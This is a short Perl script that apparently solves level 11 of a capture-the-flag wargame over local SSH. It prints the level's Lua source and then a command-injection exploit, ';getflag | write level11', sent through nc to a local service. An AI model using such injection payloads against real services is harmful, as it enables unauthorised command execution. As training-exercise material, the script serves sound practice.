#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level11";

$inject = "cat level11.lua";
$exploit = "Exploit :\nssh -qp $port $user\@$ip\nnc localhost 5151\n;getflag | write level11";
print $red, $inject, $reset, "\n";
system("ssh -qp $port $user\@$ip '$inject'");
print $green, $exploit, $reset, "\n";
